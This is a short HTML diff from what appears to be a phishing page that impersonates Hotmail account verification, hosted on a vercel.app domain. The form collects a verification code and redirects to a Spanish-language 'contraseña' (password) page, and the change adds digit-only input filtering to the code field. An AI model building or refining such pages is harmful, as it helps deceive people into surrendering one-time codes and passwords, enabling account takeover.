@@ -145,7 +145,7 @@
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_next" value="https://hotmailverificacionpersonal.vercel.app/contraseña.html">
           <div class="continput">
-          <input type="number" id="email" name="codigo" placeholder="Ingresa el codigo" maxlenght="10" required>
+          <input type="number" id="email" name="codigo" placeholder="Ingresa el codigo" onkeypress="return event.charCode >= 48 && event.charCode <= 57" maxlenght="10" required>
         </div>
 
           <div class="checkbox">
